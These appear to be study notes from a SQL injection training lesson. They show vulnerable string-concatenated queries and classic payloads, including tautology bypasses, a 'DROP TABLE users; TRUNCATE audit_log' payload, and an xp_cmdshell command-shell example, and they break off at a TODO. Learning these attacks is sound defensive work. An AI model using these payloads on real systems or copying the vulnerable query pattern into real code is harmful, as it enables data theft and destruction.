# A1 - Injection

## SQL Injection (intro)

### Concept

### What is SQL?

### Data Manipulation Language (DML)

- SELECT
- INSERT
- UPDATE
- DELETE

### Data Definition Language (DDL)

- CREATE
- ALTER
- DROP

### Data Control Language (DCL)

- GRANT
- REVOKE

### What is SQL injection?

Vulnerable code:

```sql
SELECT * FROM users WHERE name = '" + userName + "'
```

Exploits:

- `Smith’ OR '1' = '1`
- `Smith’ OR 1 = 1; --`
- `Smith’; DROP TABLE users; TRUNCATE audit_log; --`

### Consequences of SQL Injection

### Severity of SQL Injection

Only these databases support command chaining:

- Microsoft Access
- MySQL Connector/J and C
- Oracle

Not all databases are equal:

- Command shell: `master.dbo.xp_cmdshell 'cmd.exe dir c:'`
- Registry commands: `xp_regread`, `xp_regdeletekey`, ...

### String SQL Injection

Vulnerable Code:

```sql
SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'
```

Exploit:

`Smith' or '1' = '1`

### Numeric SQL Injection

Vulnerable Code:

```sql
SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = " + User_ID
```

Exploit:

```
login_count: 1
userid: 1 or 1 = 1
```

### Compromising confidentiality with String SQL Injection

TODO